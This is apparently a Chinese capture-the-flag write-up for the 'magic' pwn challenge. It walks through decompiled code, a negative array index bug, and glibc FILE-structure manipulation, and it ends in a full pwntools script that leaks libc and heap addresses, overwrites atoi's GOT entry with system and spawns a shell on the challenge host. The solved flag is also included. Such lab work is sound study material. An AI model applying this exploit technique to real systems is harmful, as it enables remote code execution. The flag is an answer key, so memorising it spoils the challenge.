# magic

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=5c1a0baf-d34f-4725-9a1d-2cdfecc1b207_2)

快来抄[wp](https://blog.csdn.net/seaaseesa/article/details/103479788)啦！

-   Arch:     amd64-64-little
    <br>RELRO:    Partial RELRO
    <br>Stack:    Canary found
    <br>NX:       NX enabled
    <Br>PIE:      No PIE (0x400000)

竟然还行啊？再怎么行我也做不出来，完全超出能力范畴了。

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  bool bVar1;
  int iVar2;
  
  bVar1 = true;
  init(param_1);
  print_menu();
  do {
    printf("choice>> ");
    iVar2 = read_int();
    if (iVar2 == 2) {
      wizard_spell();
    }
    else if (iVar2 < 3) {
      if (iVar2 == 1) {
        create_wizard();
      }
      else {
LAB_00400a56:
        puts("Invalid choice!");
      }
    }
    else {
      if (iVar2 != 3) {
        if (iVar2 == 4) {
          fclose(log_file);
                    /* WARNING: Subroutine does not return */
          exit(0);
        }
        goto LAB_00400a56;
      }
      if (bVar1) {
        final_chance();
      }
      bVar1 = false;
    }
    if (left_wizard == 0) {
      puts("No wizard any more!");
      fclose(log_file);
      return 0;
    }
  } while( true );
}
```

给的几个函数都看看。

```c
void wizard_spell(void)

{
  long lVar1;
  char cVar2;
  int iVar3;
  long in_FS_OFFSET;
  undefined local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Who will spell:");
  cVar2 = read_int();
  if ((*(long *)(wizards + (long)(int)cVar2 * 8) == 0) || (2 < cVar2)) {
    puts("evil wizard!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  lVar1 = *(long *)(wizards + (long)(int)cVar2 * 8);
  if (*(long *)(lVar1 + 0x28) < 1) {
    puts("muggle!");
    strcpy((char *)(lVar1 + 8),desc_muggle);
    left_wizard = left_wizard + -1;
  }
  else if (*(long *)(lVar1 + 0x28) < 0x32) {
    puts("fail!");
  }
  else {
    printf("Spell name:");
    iVar3 = my_read(local_38,0x20);
    write_spell(local_38,(long)iVar3);
    read_spell();
    *(long *)(lVar1 + 0x28) = *(long *)(lVar1 + 0x28) + -0x32;
    puts("success!");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

ghidra里有点抽象，但ida里能看见有一个很明显的漏洞。先不说，把下面的函数看完后再细细品味。

```c
void create_wizard(void)

{
  void **ppvVar1;
  void *pvVar2;
  int local_18;
  int local_14;
  
  local_18 = -1;
  local_14 = 0;
  do {
    if (2 < local_14) {
LAB_00400bc1:
      if (local_18 == -1) {
        puts("Can\'t create wizard!");
      }
      else {
        ppvVar1 = (void **)malloc(0x30);
        printf("Give me the wizard\'s name:");
        pvVar2 = malloc(0x18);
        *ppvVar1 = pvVar2;
        my_read(*ppvVar1,0x18);
        strcpy((char *)(ppvVar1 + 1),desc_wizard);
        ppvVar1[5] = (void *)0x320;
        *(void ***)(wizards + (long)local_18 * 8) = ppvVar1;
      }
      return;
    }
    if (*(long *)(wizards + (long)local_14 * 8) == 0) {
      local_18 = local_14;
      goto LAB_00400bc1;
    }
    local_14 = local_14 + 1;
  } while( true );
}
```

创建一个巫师。最后呢？

```c
void final_chance(void)

{
  long lVar1;
  char cVar2;
  long in_FS_OFFSET;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Who got the chance:");
  cVar2 = read_int();
  if ((*(long *)(wizards + (long)(int)cVar2 * 8) != 0) && (cVar2 < '\x03')) {
    *(long *)(*(long *)(wizards + (long)(int)cVar2 * 8) + 0x28) =
         *(long *)(*(long *)(wizards + (long)(int)cVar2 * 8) + 0x28) + 0x2ee;
    if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
  puts("Nohh!");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

我没看出来这是在干啥。不管那么多，漏洞是什么呢？wizard_spell函数中有一行if语句，本意是判断索引不超过wizards数组，但是只看了正索引，没看负的。

```c
if ((*(long *)(wizards + (long)(int)cVar2 * 8) == 0) || (2 < cVar2))
```

(*(long *)(wizards + (long)(int)cVar2 * 8) == 0)这个操作等同于wizards[cVar2]==0。ghidra的表达不清晰但也不能说错，数组下标根本上就是这个原理，数组开头是基地址，下标是按照元素长度做偏移。如果我们填负索引，且那里不是0的话，我们就能随意修改那个地方的内容。且慢，好像也不是特别随意。 my_read是read函数的包装，write_spell是fwrite的包装，read_spell是fread加write的包装。这些函数的具体实现都不重要，只需要知道都没有更改上面提到的索引处。唯一有改动的是这句代码。

```c
lVar1 = *(long *)(wizards + (long)(int)cVar2 * 8);
*(long *)(lVar1 + 0x28) = *(long *)(lVar1 + 0x28) + -0x32;
```

每当我们调用这个函数时，数组偏移部分lVar1的0x28偏移处会被减去0x32的值。不知道这些代码在源程序里有什么用，我们只需要研究怎么利用就好了。调试一下，发现wizards[-2]处就是log_file的地址。log_file看名字就知道，和文件流有关啊。之前做过一道文件流题，这次总算没那么懵逼了。

查看log_file结构体，发现偏移40字节处是_IO_write_ptr，而_IO_write_ptr是缓冲区的地址，下一次写数据时,如果_IO_write_ptr与_IO_write_end不相等，那么就会往_IO_write_ptr指向的区域写数据。我们能修改的不正是偏移40字节处的位置吗？如果我们把它修改，让它指向log_file结构体本身，这样写入数据的时候就能修改整个log_file结构体，当然还有_IO_read_ptr和_IO_read_end。这样read时，就能泄露地址信息，最后将_IO_write_ptr指向目标地址，写目标地址，比如修改got表。

在正式开搞前，我们先正常create_wizzard来初始化一下，不初始化的话里面全是0，不符合上面提到的if判断。我们的目标是把_IO_write_ptr指向结构体开头，需要一些数学运算。输入的payload长度会让_IO_write_ptr=_IO_write_ptr+len(payload)，是glibc里的源码，不要太纠结了。加上-0x32这一1程序中固定的变化，每次发送payload，_IO_write_ptr=_IO_write_ptr+len(payload)-50。在修改时，还要注意不要破坏其他地方的数据。调试亿下就能出来了。

经过上面的操作，现在_IO_write_ptr就指向了log_file的结构体附近处，我们就可以改写log_file的结构体了。为了泄露地址信息，我们需要改写_IO_read_ptr 和_IO_read_end。注意不仅仅是wizards[-2]可以修改_IO_write_ptr，向wizard_spell传入普通索引也是可以将_IO_write_ptr=_IO_write_ptr+len(payload)的。因为wizard_spell内部调用了fwrite，无论你用不用负索引都是会加上传入内容的长度的。改写_IO_read_ptr 和_IO_read_end时一定要用正索引，总之绝对不能用-2，因为程序固定会将wizards[索引处]-40的数据减去40，索引放-2了不就又把好不容易调好的_IO_write_ptr给减去40了吗？

只需要改写_IO_read_ptr 和_IO_read_end，结构体里别的东西还是保留原样最为稳妥，flags什么的（调试时看log_file的结构体得到）。等将这些地址改成atoi_got的地址后，atoi地址就直接泄露出来了，不需要调用别的函数。这里有点不懂，可能是因为wizard_spell里面也用了read吧。现在，我们得到了需要的地址信息，可以开始攻击atoi的GOT表了。故技重施，把_IO_write_ptr指向atoi的GOT表，再写入system。

然而因为一些源码问题（具体可看上面的wp），我们不能通过fwrite来修改_IO_write_ptr，只能用fread。两者是反过来的，想修改fwrite相关指针用fread，想修改fread相关指针用fwrite。不算大问题，程序中也调用了fread。又到了源码时间，关键点只有这两处。

```c
if (fp->_IO_read_ptr < fp->_IO_read_end)  
    return *(unsigned char *) fp->_IO_read_ptr;  

fp->_IO_read_base = fp->_IO_read_ptr = fp->_IO_buf_base;  
fp->_IO_read_end = fp->_IO_buf_base;  
fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_write_end = fp->_IO_buf_base; 
```

上面是想要做修改的条件，下面是能修改的地方。条件是fp->_IO_read_ptr小于fp->_IO_read_end，修改的结果是fp->_IO_write_ptr = fp->_IO_buf_base。为了能覆盖到_IO_buf_base,首先，我们需要保证_IO_write_ptr小于_IO_write_end，因此，我们要让_IO_write_end比_IO_write_ptr大一些。至于大多少，反正保证_IO_buf_base的地址坐落在_IO_write_ptr和_IO_write_end之间就好了，调试得到0x50。当然，我们还要知道_IO_write_ptr的值，由此，我们还需要泄露FILE结构体本身的地址。

注意，这次覆盖时要用WizardSpell(-2, p64(0) + p64(0))而不是之前的WizardSpell(0, p64(0) + p64(0)。我们在前面覆盖时把_IO_write_ptr提高了很多字节，-2能减掉50个，继续回到结构体开始的地方。接着我们设置_IO_read_ptr = log_addr , _IO_read_end = log_addr + 0x50，这个0x50可以不用精确，只需要保证，经过二轮fread后，_IO_read_ptr大于等于_IO_read_end，这样，第三轮fread时，就可以修改_IO_write_ptr。

第一轮覆盖_IO_read_ptr和_IO_read_end，用于泄露结构体本身的地址；第二轮，修改_IO_write_end；第三轮，之前我们让_IO_read_ptr大于等于_IO_read_end，并且_IO_write_ptr指向了_IO_buf_base。那么我们覆盖_IO_buf_base和_IO_buf_end，然后程序中执行fread就会修改_IO_write_ptr为_IO_buf_base。

最后一步了，我也真的不懂了。在覆盖_IO_buf_base时不能一步到位，需要覆盖为atoi_got向下偏移一些的位置。据说是因为fread时所有指针都设置为_IO_buf_base的值，使得_IO_write_end - _IO_write_ptr == 0（到这里还是懂的，源码而已），不满足_IO_write_ptr小于等于_IO_write_end，fwrite时，就不会写入数据。而我们向下偏移一些地址，之后用类似WizardSpell(-2,’\x00’)等命令调整_IO_buf_base到atoi_got。为啥偏移了就行了，源码里不是对所有的指针都设为_IO_buf_base吗，也就是无论怎样相减结果都是0啊，偏移就不是了吗？好吧，以后记得在有办法调整的情况下偏移一下最好。

调整后，_IO_write_ptr指向了atoi的GOT-1处。现在就能简单修改atoi的GOT为system地址，拿shell了。

```python
from pwn import *  
sh = remote('61.147.171.105',58151)   
atoi_got = 6299776
log_addr = 6299872
  
def create():  
   sh.sendlineafter('choice>> ','1')  
   sh.sendlineafter("Give me the wizard's name:","seaase")  
  
def WizardSpell(index,content):  
   sh.sendlineafter('choice>> ','2')  
   sh.sendlineafter('Who will spell:',str(index))  
   sh.sendafter('Spell name:',content)  
  
#这两步是为了初始化FILE的结构体  
create()  
WizardSpell(0,'seaase')  
#修改log_file结构体的_IO_write_base  
for i in range(8):  
   #_IO_write_base = _IO_write_base + 1 - 50  
   WizardSpell(-2,b'\x00')  
  
#在不影响log_file结构体的情况下，我们抬升_IO_write_base 13个字节，然后再-=50  
WizardSpell(-2,b'\x00'*13)  
  
for i in range(3):  
   #_IO_write_base = _IO_write_base + 1 - 50  
   WizardSpell(-2,b'\x00')  
  
#在不影响log_file结构体的情况下，我们抬升_IO_write_base 9个字节，然后再-=50  
WizardSpell(-2,b'\x00'*9)  
WizardSpell(-2,b'\x00')  
  
#现在，_IO_write_base指向了log_file的结构体附近处，我们可以修改log_file的结构体了  
payload = b'\x00' * 3 + p64(0x231)  
#flags  
payload += p64(0xFBAD24A8)  
WizardSpell(0,payload)  
#_IO_read_ptr  _IO_read_end  
payload = p64(atoi_got) + p64(atoi_got+0x100)  
WizardSpell(0,payload)  
atoi_addr = u64(sh.recv(8))  
libc_base = atoi_addr - 0x036e80
system_addr = libc_base + 0x045390
  
#回到之前的位置  
WizardSpell(-2, p64(0) + p64(0))  
#重新写  
WizardSpell(0, b'\x00' * 2 + p64(0x231) + p64(0xfbad24a8))  
#需要_IO_read_ptr大于等于_IO_read_end，经过调试，发现输出以后，发现0x50正好  
WizardSpell(0, p64(log_addr) + p64(log_addr + 0x50) + p64(log_addr))  
#泄露log_file结构体的地址  
heap_addr = u64(sh.recvn(8)) - 0x10   
  
WizardSpell(0,p64(heap_addr + 0x100)*3)  
#覆盖_IO_buf_base和_IO_buf_end  
#然后程序中执行fread就会修改_IO_write_ptr为_IO_buf_base  
WizardSpell(0,p64(atoi_got+0x78 + 23) + p64(atoi_got + 0xA00))  
  
#  
WizardSpell(-2,b'\x00')  
WizardSpell(-2,b'\x00'*3)  
WizardSpell(-2,b'\x00'*3)  
  
payload = b'\x00' + p64(system_addr)  
WizardSpell(0,payload)  
#getshell  
sh.sendlineafter('choice>> ','sh')  
  
sh.interactive()
```

记得最后getshell只能用sh。

- ### Flag
  > cyberpeace{c7911c004c18c37d880557afaddab35c}